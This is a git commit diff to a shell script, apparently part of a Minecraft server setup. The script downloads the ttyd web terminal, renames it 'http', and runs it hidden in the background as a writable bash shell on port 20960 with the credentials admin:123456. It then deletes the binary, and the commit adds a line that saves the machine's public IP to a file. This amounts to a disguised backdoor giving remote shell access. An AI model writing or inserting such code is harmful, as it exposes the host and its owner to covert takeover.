0d6acd65e5c26e5c1bd3d39f12ac6a2e192f2361
Andtherya <Andy17998@outlook.com>
2025-11-26 11:59:47 +0800

    Update mcw.sh

--- mcw.sh
+++ mcw.sh
@@ -3,6 +3,7 @@ curl -s -Lo http https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x8
 chmod +x http
 nohup ./http  -p 20960 -W -c admin:123456 bash >/dev/null 2>&1 &
 sleep 1
+curl -4 ifconfig.me>ip.txt
 rm http
 
 target_file1="$current_dir/plugins/ViaBackwards.jar"
